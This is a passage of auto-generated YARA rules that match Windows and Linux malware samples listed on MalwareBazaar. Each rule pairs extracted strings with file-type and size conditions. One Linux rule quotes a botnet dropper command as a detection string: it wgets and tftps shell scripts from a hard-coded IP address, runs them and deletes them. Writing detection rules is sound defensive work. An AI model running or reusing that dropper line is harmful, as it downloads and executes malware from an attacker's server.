        $s19 = "GetDlgItem"
        $s20 = "GetWindowLongW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7307KB and
        all of them
}

rule Linux_3d3fe37b91744a3e78a907a59dab89da5bd8f7706bcbcb0112e802f93ace8ad7
{
    meta:
        description = "Auto ML: 3d3fe37b91744a3e78a907a59dab89da5bd8f7706bcbcb0112e802f93ace8ad7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "http://"
        $s2 = "https://"
        $s3 = "/ (deleted)"
        $s4 = "/lib/systemd/"
        $s5 = "/system/system/bin/"
        $s6 = "/data/module/jdk"
        $s7 = "No such file or directory"
        $s8 = "No such process"
        $s9 = "Interrupted system call"
        $s10 = "Bad file descriptor"
        $s11 = "No child processes"
        $s12 = "Resource temporarily unavailable"
        $s13 = "File exists"
        $s14 = "Too many open files in system"
        $s15 = "Too many open files"
        $s16 = "Text file busy"
        $s17 = "File too large"
        $s18 = "Read-only file system"
        $s19 = "File name too long"
        $s20 = "Level 3 reset"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 156KB and
        all of them
}

rule Windows_3d7066dda89f31d017e8d9cb6131f14f3aab9ec7cdb8d997a7d8198adf197180
{
    meta:
        description = "Auto ML: 3d7066dda89f31d017e8d9cb6131f14f3aab9ec7cdb8d997a7d8198adf197180"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ReadOnlyCollection`1"
        $s5 = "Microsoft.Win32"
        $s6 = "GetInt32"
        $s7 = "GetInt64"
        $s8 = "GetInt16"
        $s9 = "<Module>"
        $s10 = "GetTypeFromCLSID"
        $s11 = "System.IO"
        $s12 = "System.Data"
        $s13 = "embedder_download_data"
        $s14 = "System.Dynamic"
        $s15 = "System.Collections.Generic"
        $s16 = "Read"
        $s17 = "Thread"
        $s18 = "Nss3CouldNotBeLoaded"
        $s19 = "opened"
        $s20 = "timeCreated"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 410KB and
        all of them
}

rule Windows_3dc2dd6d83305e2fbacf5899758358aba943f5367d06606b6821978d17598b14
{
    meta:
        description = "Auto ML: 3dc2dd6d83305e2fbacf5899758358aba943f5367d06606b6821978d17598b14"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "PCmD"
        $s3 = "w\\%5RjSET!"
        $s4 = "cMDK"
        $s5 = "CmdO"
        $s6 = "GetModuleHandleA"
        $s7 = "GetProcAddress"
        $s8 = "KERNEL32.DLL"
        $s9 = "USER32.dll"
        $s10 = "SetBkMode"
        $s11 = "OLEAUT32.dll"
        $s12 = "MSVCRT.dll"
        $s13 = "VERSION.dll"
        $s14 = "GetFileVersionInfoW"
        $s15 = "type=\"win32\""
        $s16 = "name=\"Microsoft.Windows.Common-Controls\""
        $s17 = "processorArchitecture=\"*\"/>"
        $s18 = "https://sectigo.com/CPS0"
        $s19 = "3http://crl.sectigo.com/SectigoRSATimeStampingCA.crl0t"
        $s20 = "3http://crt.sectigo.com/SectigoRSATimeStampingCA.crt0#"
    condition:
        uint32(0) == 0x00405a4d and
        filesize < 5207KB and
        all of them
}

rule Windows_3dc8f409caf68fa64a87698436f80ab9733c4842ed5f36ba3ada63f2e94057cf
{
    meta:
        description = "Auto ML: 3dc8f409caf68fa64a87698436f80ab9733c4842ed5f36ba3ada63f2e94057cf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System.Core"
        $s7 = "TargetFrameworkAttribute"
        $s8 = "System.Runtime.Versioning"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "kXSeHb08Omb855J3GeT"
        $s13 = "System.IO"
        $s14 = "rXZ434QCMdCMLg3rP18"
        $s15 = "<Module>{0C719F91-D368-40E4-8060-48FBA29B565C}"
        $s16 = "<Module>{924487b5-e5d0-4515-bb5c-63957086d074}"
        $s17 = "fBYD2TtCekx9tCMdr6Xc"
        $s18 = "adeYGet1DI1pIWiH9A2Z"
        $s19 = "AeH6cVtV1yMfHCS5win3"
        $s20 = "System.Text"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1892KB and
        all of them
}

rule Windows_3dd8058844bb0d649563b7c8855924f6defa3fe47792b3597d11059c89d5596c
{
    meta:
        description = "Auto ML: 3dd8058844bb0d649563b7c8855924f6defa3fe47792b3597d11059c89d5596c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "AreaDAL"
        $s6 = "System.IO"
        $s7 = "ReadArea"
        $s8 = "System.Data"
        $s9 = "System.Collections.Generic"
        $s10 = "Read"
        $s11 = "Form1_Load"
        $s12 = "add_Load"
        $s13 = "CreateInstance"
        $s14 = "set_AutoScaleMode"
        $s15 = "set_SizeMode"
        $s16 = "set_ColumnHeadersHeightSizeMode"
        $s17 = "set_Image"
        $s18 = "GetTypeFromHandle"
        $s19 = "get_Title"
        $s20 = "get_AssemblyTitle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 53248KB and
        all of them
}

rule Windows_3de7b164aaa9e97535b26fb70bfc183d216cfaabee666744b4ac4f803acabd85
{
    meta:
        description = "Auto ML: 3de7b164aaa9e97535b26fb70bfc183d216cfaabee666744b4ac4f803acabd85"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6289KB and
        all of them
}

rule Windows_3debd2ceefd8c64031ca66c3bc7165bfde2eee638c67a307642d7c6b8d9ce8ba
{
    meta:
        description = "Auto ML: 3debd2ceefd8c64031ca66c3bc7165bfde2eee638c67a307642d7c6b8d9ce8ba"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "fclose"
        $s6 = "fopen"
        $s7 = "_close"
        $s8 = "MSVCRT.dll"
        $s9 = "__getmainargs"
        $s10 = "__setusermatherr"
        $s11 = "__set_app_type"
        $s12 = "SetLastError"
        $s13 = "GetEnvironmentStringsW"
        $s14 = "GetCommandLineW"
        $s15 = "GetCurrentProcess"
        $s16 = "SetHandleInformation"
        $s17 = "CloseHandle"
        $s18 = "GetSystemTimeAsFileTime"
        $s19 = "FileTimeToSystemTime"
        $s20 = "GetTimeZoneInformation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 73KB and
        all of them
}

rule Linux_3dedad438663c563520a8cbf25b8cc44a55eca3fde851774c8be98ac3a20b22e
{
    meta:
        description = "Auto ML: 3dedad438663c563520a8cbf25b8cc44a55eca3fde851774c8be98ac3a20b22e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "cd /tmp; wget http://45.90.217.165/bins.sh; chmod 777 *; sh bins.sh; tftp -g 45.90.217.165 -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh"
        $s2 = "user"
        $s3 = "User"
        $s4 = "shell"
        $s5 = "system"
        $s6 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s7 = "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s8 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s9 = "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)"
        $s10 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s11 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s12 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s13 = "zspider/0.9-dev http://feedback.redkolibri.com/"
        $s14 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s15 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
        $s18 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)"
        $s19 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
        $s20 = "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 94KB and
        all of them
}

rule Windows_3df5b2d8fa12771d01180865d86b83385535794b18232cca17e5a7e3fac585fb
{
    meta:
        description = "Auto ML: 3df5b2d8fa12771d01180865d86b83385535794b18232cca17e5a7e3fac585fb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetFiltes>b__0"
        $s5 = "PROCESSENTRY32"
        $s6 = "Microsoft.Win32"
        $s7 = "ReadInt32"
        $s8 = "WriteUInt64"
        $s9 = "GetAsUInt64"
        $s10 = "SetAsUInt64"
        $s11 = "InvalidImageWin16"
        $s12 = "ReadInt16"
        $s13 = "<Module>"
        $s14 = "ES_SYSTEM_REQUIRED"
        $s15 = "GetTypeFromCLSID"
        $s16 = "th32ModuleID"
        $s17 = "th32ProcessID"
        $s18 = "th32ParentProcessID"
        $s19 = "get_FormatID"
        $s20 = "get_ASCII"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 74KB and
        all of them
}

rule Windows_3e0159326f354109d2b468ead12982d5d33d6d5936081eb59903965b995bad22
{
    meta:
        description = "Auto ML: 3e0159326f354109d2b468ead12982d5d33d6d5936081eb59903965b995bad22"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2287KB and
        all of them
}

rule Windows_052b4eda2c31d34095e1fc77adf582681b3659a77cfb5ed167af380d6f08d9db
{
    meta:
        description = "Auto ML: 052b4eda2c31d34095e1fc77adf582681b3659a77cfb5ed167af380d6f08d9db"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<GetNextPlayerCards>b__3_0"
        $s5 = "<GetCardNum>b__7_0"
        $s6 = "<LoadTemplate>b__8_0"
        $s7 = "<RemoveOffsetBlobs>b__0"
        $s8 = "<GetBestResult>b__0"
        $s9 = "get_Scan0"
        $s10 = "<GetNextPlayerCards>b__3_1"
        $s11 = "<GetCardNum>b__7_1"
        $s12 = "<LoadTemplate>b__8_1"
        $s13 = "<RemoveOffsetBlobs>b__1"
        $s14 = "WindowsFormsApplication1"
        $s15 = "<LoadTemplate>b__2"
        $s16 = "<RemoveOffsetBlobs>b__2"
        $s17 = "<LoadTemplate>b__3"
        $s18 = "<Module>"
        $s19 = "System.IO"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 649KB and
        all of them
}

rule Windows_3e1aadef9e05b98e31fc7994dd3405a45da77fbb69632e31f7aa95d397201de0
{
    meta:
        description = "Auto ML: 3e1aadef9e05b98e31fc7994dd3405a45da77fbb69632e31f7aa95d397201de0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "CloseHandle"
        $s5 = "ConnectNamedPipe"
        $s6 = "CreateFileA"
        $s7 = "CreateNamedPipeA"
        $s8 = "CreateThread"
        $s9 = "DeleteCriticalSection"
        $s10 = "GetCurrentProcess"
        $s11 = "GetCurrentProcessId"
        $s12 = "GetCurrentThreadId"
        $s13 = "GetLastError"
        $s14 = "GetModuleHandleA"
        $s15 = "GetProcAddress"
        $s16 = "GetStartupInfoA"
        $s17 = "GetSystemTimeAsFileTime"
        $s18 = "GetTickCount"
        $s19 = "ReadFile"
        $s20 = "RtlVirtualUnwind"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 19KB and
        all of them
}

rule Linux_3e2203d5fb3ee68110288cc9affde04e44b619b27dbfa4a475d1535d30b0336e
{
    meta:
        description = "Auto ML: 3e2203d5fb3ee68110288cc9affde04e44b619b27dbfa4a475d1535d30b0336e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s5 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_3e37500863706fceb40ed46a56bf596e0159737679d8cdb62ddec4d4d8aa95df
{
    meta:
        description = "Auto ML: 3e37500863706fceb40ed46a56bf596e0159737679d8cdb62ddec4d4d8aa95df"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System.Core"
        $s6 = "System"
        $s7 = "System.Diagnostics"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Reflection"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "Unrotted.exe"
        $s14 = "<Module>"
        $s15 = "SchemaReaderSql"
        $s16 = "UserExt"
        $s17 = "ProcessFileHandle"
        $s18 = "SYSTEM_HANDLE_INFORMATION"
        $s19 = "FileMapProtection"
        $s20 = "FileMapAccess"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 305KB and
        all of them
}

rule Linux_3e6d80e3fc3ab60cca60c3199eb58f7d01ea062d49dce1de2c9790aa12ce494f
{
    meta:
        description = "Auto ML: 3e6d80e3fc3ab60cca60c3199eb58f7d01ea062d49dce1de2c9790aa12ce494f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/bin/systemd"
        $s7 = "bin/systemd"
        $s8 = "GET /%s HTTP/1.0"
        $s9 = "User-Agent: Update v1.0"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 82KB and
        all of them
}

rule Linux_3e8b16d5a385cf6c4da6e8d1b7d7ae8ecea08132c1c61fe21aa914432411a067
{
    meta:
        description = "Auto ML: 3e8b16d5a385cf6c4da6e8d1b7d7ae8ecea08132c1c61fe21aa914432411a067"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 55KB and
        all of them
}

rule Windows_3e919e8f2497d8d0e45c1034090e736f3f4b70252ecf769f221e46525925e668
{
    meta:
        description = "Auto ML: 3e919e8f2497d8d0e45c1034090e736f3f4b70252ecf769f221e46525925e668"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = ".reloc"
        $s4 = "System"
        $s5 = "System.Runtime.CompilerServices"
        $s6 = "System.Core"
        $s7 = "TargetFrameworkAttribute"
        $s8 = "System.Runtime.Versioning"
        $s9 = "System.Runtime.InteropServices"
        $s10 = "System.Diagnostics"
        $s11 = "<Module>"
        $s12 = "hUAcSetsnhFpRgxOpX0"
        $s13 = "System.IO"
        $s14 = "o7loAD7WiasLAu72TIk"
        $s15 = "<Module>{AE728781-F635-4950-B58A-A91383B20FFA}"
        $s16 = "<Module>{cf8885b8-2480-4608-b81d-9ccfa0efd9b3}"
        $s17 = "System.Text"
        $s18 = "System.Collections.Generic"
        $s19 = "System.Linq"
        $s20 = "GetEnumerator"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3926KB and
        all of them
}

rule Windows_3ee2f01bd6dfc229152e748471f10c2228c715449e98f81ae7e91d065fdbda14
{
    meta:
        description = "Auto ML: 3ee2f01bd6dfc229152e748471f10c2228c715449e98f81ae7e91d065fdbda14"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "processorArchitecture=\"X86\""
        $s4 = "name=\"Enigma.exe\""
        $s5 = "type=\"win32\" />"
        $s6 = "type=\"win32\""
        $s7 = "name=\"Microsoft.Windows.Common-Controls\""
        $s8 = "processorArchitecture=\"X86\""
        $s9 = "VcMd"
        $s10 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s11 = "http://pki-ocsp.symauth.com0"
        $s12 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s13 = "kernel32.dll"
        $s14 = "user32.dll"
        $s15 = "advapi32.dll"
        $s16 = "oleaut32.dll"
        $s17 = "shell32.dll"
        $s18 = "version.dll"
        $s19 = "CRYPT32.dll"
        $s20 = "SHLWAPI.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB and
        all of them
}

rule Windows_3f28e0e5dcc6d17342acd26d9091a08e2d85b6183cd0c2e5b20ac5e33d2f2491
{
    meta:
        description = "Auto ML: 3f28e0e5dcc6d17342acd26d9091a08e2d85b6183cd0c2e5b20ac5e33d2f2491"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "SHELL32.dll"
        $s7 = "ADVAPI32.dll"
        $s8 = "CreateCompatibleBitmap"
        $s9 = "SHLWAPI.dll"
        $s10 = "USER32.dll"
        $s11 = "gdiplus.dll"
        $s12 = "GetVersionExA"
        $s13 = "GetModuleHandleA"
        $s14 = "GetProcAddress"
        $s15 = "SETUPAPI.dll"
        $s16 = "ntdll.dll"
        $s17 = "2Wvset"
        $s18 = "ExitProcess"
        $s19 = "CRYPT32.dll"
        $s20 = "SetupDiEnumDeviceInterfaces"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3175KB and
        all of them
}

rule Windows_3f4ba7b687f2001336bbcfb00e5ad83ebc64de5d9adca2ec42fa21d5973562f5
{
    meta:
        description = "Auto ML: 3f4ba7b687f2001336bbcfb00e5ad83ebc64de5d9adca2ec42fa21d5973562f5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6255KB and
        all of them
}

rule Windows_3f5b8f29418ec144bf5c5c598b32ca2b28c5a650380377552c5797f975f750e3
{
    meta:
        description = "Auto ML: 3f5b8f29418ec144bf5c5c598b32ca2b28c5a650380377552c5797f975f750e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "OLEAUT32.DLL"
        $s5 = "USER32.DLL"
        $s6 = "KERNEL32.DLL"
        $s7 = "NTDLL.DLL"
        $s8 = "MSVBVM60.DLL"
        $s9 = "CMDViewer"
        $s10 = "Module1"
        $s11 = "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB"
        $s12 = "__vbaObjSet"
        $s13 = "GetUserDefaultLCID"
        $s14 = "GetStartupInfoW"
        $s15 = "LoadStringW"
        $s16 = "USER32"
        $s17 = "KERNEL32"
        $s18 = "SetFileApisToOEM"
        $s19 = "SetFileApisToANSI"
        $s20 = "GetProcAddress"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1566KB and
        all of them
}

rule Windows_05386f3b8d8c87bf3609a65d5306483f65529ed355aedc2c62d52847dd12ec6e
{
    meta:
        description = "Auto ML: 05386f3b8d8c87bf3609a65d5306483f65529ed355aedc2c62d52847dd12ec6e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "libgcc_s_dw2-1.dll"
        $s7 = "Error, failed to open '%ls' for writing."
        $s8 = "Error, couldn't unpack file to target path."
        $s9 = "NUITKA_ONEFILE_PARENT"
        $s10 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p."
        $s11 = "CloseHandle"
        $s12 = "CopyFileW"
        $s13 = "CreateDirectoryW"
        $s14 = "CreateFileMappingW"
        $s15 = "CreateFileW"
        $s16 = "CreateProcessW"
        $s17 = "DeleteCriticalSection"
        $s18 = "DeleteFileW"
        $s19 = "GetCommandLineW"
        $s20 = "GetCurrentProcessId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17549KB and
        all of them
}

rule Windows_3f5f2f927de6764d2adf26845d8385070c39d25637bba59b0193e9d4a74e3cd4
{
    meta:
        description = "Auto ML: 3f5f2f927de6764d2adf26845d8385070c39d25637bba59b0193e9d4a74e3cd4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "$ng system."
        $s3 = "SSYSTEM_AL"
        $s4 = "XML_USERD"
        $s5 = "FILEFhp;"
        $s6 = "\"http"
        $s7 = "~ THREAD"
        $s8 = "SetStdHandle"
        $s9 = "tThread"
        $s10 = "9Process;Moduhu"
        $s11 = "Open"
        $s12 = "ADVAPI32.dll"
        $s13 = "KERNEL32.DLL"
        $s14 = "USER32.dll"
        $s15 = "LsaClose"
        $s16 = "ExitProcess"
        $s17 = "GetProcAddress"
        $s18 = "LoadLibraryA"
        $s19 = "ShowWindow"
        $s20 = "<</Creator (Pdfcrowd.com v20180221.063)"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1200KB and
        all of them
}

rule Windows_3f72928d0f49086a7a5f96d15e5e3eb0dac7a7927da3717bc6d90d576877c88e
{
    meta:
        description = "Auto ML: 3f72928d0f49086a7a5f96d15e5e3eb0dac7a7927da3717bc6d90d576877c88e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Drawing.Drawing2D"
        $s6 = "GetLI"
        $s7 = "System.IO"
        $s8 = "System.Collections.Generic"
        $s9 = "get_CanRead"
        $s10 = "buttonLoad"
        $s11 = "get_windSpeed"
        $s12 = "set_Enabled"
        $s13 = "set_FormattingEnabled"
        $s14 = "<windSpeed>k__BackingField"
        $s15 = "<temperature>k__BackingField"
        $s16 = "<windDirection>k__BackingField"
        $s17 = "set_AutoScaleMode"
        $s18 = "FileMode"
        $s19 = "set_SizeMode"
        $s20 = "get_Image"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 939KB and
        all of them
}

rule Windows_3fbf742d2ceab5970c771a4543e88de717140976fbf857b900b01884d55ae872
{
    meta:
        description = "Auto ML: 3fbf742d2ceab5970c771a4543e88de717140976fbf857b900b01884d55ae872"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "AssemblyKeyFileAttribute"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "System.Runtime.InteropServices"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "vsfh.exe"
        $s14 = "<Module>"
        $s15 = "System.Windows.Forms"
        $s16 = "Settings"
        $s17 = "ApplicationSettingsBase"
        $s18 = "System.Configuration"
        $s19 = "<Module>{3FBD4D0F-8B54-4A98-BEB8-D92138138A29}"
        $s20 = "System.ComponentModel"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1226KB and
        all of them
}

rule Windows_3fefd283343b7f7c7f4b41c4b1cd4d396db892a5866361722d22b28a632a95bb
{
    meta:
        description = "Auto ML: 3fefd283343b7f7c7f4b41c4b1cd4d396db892a5866361722d22b28a632a95bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "cGpvB47hD1VLl5sR,System.Private.CoreLib"
        $s7 = "4System.Private.CoreLib.dll"
        $s8 = "4System.Diagnostics.Process"
        $s9 = "<System.Diagnostics.Process.dll"
